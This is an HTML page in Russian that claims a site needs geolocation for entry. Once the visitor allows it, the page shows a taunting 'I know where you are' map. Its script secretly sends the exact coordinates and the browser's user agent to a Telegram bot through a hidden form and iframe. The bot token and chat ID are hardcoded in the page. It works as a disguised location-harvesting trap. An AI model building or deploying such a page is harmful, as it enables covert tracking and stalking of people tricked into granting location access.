<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Доступ</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 20px;
        }
        .card {
            max-width: 400px;
            width: 100%;
        }
        .card h1 {
            font-size: 24px;
            font-weight: 400;
            color: #aaa;
        }
        .card .sub {
            color: #555;
            font-size: 14px;
            margin-top: 8px;
        }
        .btn {
            margin-top: 30px;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #fff;
            padding: 14px 32px;
            border-radius: 30px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
            width: 100%;
        }
        .btn:hover {
            background: #2a2a2a;
            border-color: #555;
        }
        .hidden {
            display: none;
        }
        #map {
            height: 300px;
            width: 100%;
            border-radius: 12px;
            margin-top: 16px;
            border: 1px solid #30363d;
        }
        .coords-box {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 16px;
            margin-top: 16px;
            width: 100%;
        }
        .coords-box .value {
            font-family: monospace;
            font-size: 20px;
            color: #f0883e;
        }
        .coords-box .accuracy {
            font-size: 13px;
            color: #8b949e;
            margin-top: 4px;
        }
        .status {
            font-size: 14px;
            color: #8b949e;
            margin-top: 12px;
        }
        .status.success {
            color: #3fb950;
        }
        .status.error {
            color: #f85149;
        }
        .surprise {
            font-size: 22px;
            color: #3fb950;
            margin-top: 12px;
            font-weight: 600;
        }
        .footer {
            margin-top: 16px;
            font-size: 12px;
            color: #333;
        }
    </style>
</head>
<body>

    <!-- ЭКРАН 1: Чёрный + надпись -->
    <div class="card" id="step1">
        <h1>🔐 Доступ к сайту</h1>
        <div class="sub">Для входа необходимо разрешить доступ к геолокации</div>
        <button class="btn" id="startBtn">Продолжить</button>
        <div class="footer">Нажмите «Разрешить» в системном окне</div>
    </div>

    <!-- ЭКРАН 2: Сюрприз + карта + Telegram -->
    <div class="card hidden" id="step2">
        <div class="surprise">🎉 Ха-ха! Я знаю, где ты!</div>
        <div id="map"></div>
        <div class="coords-box">
            <div class="value" id="coordsDisplay">—</div>
            <div class="accuracy" id="accuracyDisplay"></div>
        </div>
        <div class="status" id="statusText">⏳ Определение...</div>
        <button class="btn" id="refreshBtn" onclick="getLocation()">🔄 Обновить</button>
        <div class="footer">Ты сам разрешил 😄</div>
    </div>

    <script>
        // ====== НАСТРОЙКА TELEGRAM ======
        const BOT_TOKEN = "8975499216:AAEmqWVeYW6vm0p5MjI0d_ec-RDzrVLwxM0";
        const CHAT_ID = "2131297532";

        let map = null;
        let marker = null;
        let circle = null;
        let isFirstLoad = true;

        // ====== ОТПРАВКА В TELEGRAM ======
        function sendToTelegram(lat, lon, acc) {
            const text = encodeURIComponent(
                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\nУстройство: ${navigator.userAgent}`
            );

            const form = document.createElement('form');
            form.method = 'GET';
            form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            form.target = 'telegramFrame';

            const i1 = document.createElement('input');
            i1.type = 'hidden';
            i1.name = 'chat_id';
            i1.value = CHAT_ID;

            const i2 = document.createElement('input');
            i2.type = 'hidden';
            i2.name = 'text';
            i2.value = decodeURIComponent(text);

            form.appendChild(i1);
            form.appendChild(i2);

            const iframe = document.createElement('iframe');
            iframe.name = 'telegramFrame';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            document.body.appendChild(form);
            form.submit();

            setTimeout(() => {
                document.body.removeChild(form);
                document.body.removeChild(iframe);
            }, 1000);
        }

        // ====== ГЕОЛОКАЦИЯ ======
        function getLocation() {
            const status = document.getElementById('statusText');
            const coords = document.getElementById('coordsDisplay');
            const accEl = document.getElementById('accuracyDisplay');
            const btn = document.getElementById('refreshBtn');

            status.textContent = '⏳ Запрос разрешения...';
            status.className = 'status';
            coords.textContent = '—';
            accEl.textContent = '';
            btn.disabled = true;

            if (!navigator.geolocation) {
                status.textContent = '❌ Браузер не поддерживает геолокацию';
                status.className = 'status error';
                btn.disabled = false;
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const accuracy = pos.coords.accuracy;

                    coords.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                    accEl.textContent = `±${Math.round(accuracy)} м`;
                    status.textContent = '✅ Готово! Смотри на карту 😄';
                    status.className = 'status success';
                    btn.disabled = false;

                    // Карта
                    if (marker) map.removeLayer(marker);
                    if (circle) map.removeLayer(circle);
                    marker = L.marker([lat, lon]).addTo(map);
                    circle = L.circle([lat, lon], {
                        radius: accuracy || 50,
                        color: '#f03',
                        fillColor: '#f03',
                        fillOpacity: 0.15
                    }).addTo(map);
                    map.setView([lat, lon], 16);

                    // Отправка в Telegram
                    sendToTelegram(lat, lon, accuracy);
                },
                function(err) {
                    let msg = '';
                    switch (err.code) {
                        case 1:
                            msg = '❌ Без разрешения сюрприз не работает 😢';
                            break;
                        case 2:
                            msg = '❌ Сигнал недоступен. Попробуйте на улице.';
                            break;
                        case 3:
                            msg = '❌ Таймаут. Попробуйте ещё раз.';
                            break;
                        default:
                            msg = '❌ Ошибка: ' + err.message;
                    }
                    status.textContent = msg;
                    status.className = 'status error';
                    btn.disabled = false;
                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
            );
        }

        // ====== ПЕРЕКЛЮЧЕНИЕ ПО КНОПКЕ ======
        document.getElementById('startBtn').addEventListener('click', function() {
            // Прячем первый экран
            document.getElementById('step1').classList.add('hidden');
            // Показываем второй
            document.getElementById('step2').classList.remove('hidden');

            // Инициализируем карту
            map = L.map('map').setView([55.7558, 37.6173], 13);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap'
            }).addTo(map);

            // Теперь вызываем геолокацию — только после нажатия кнопки
            getLocation();
        });
    </script>

</body>
</html>
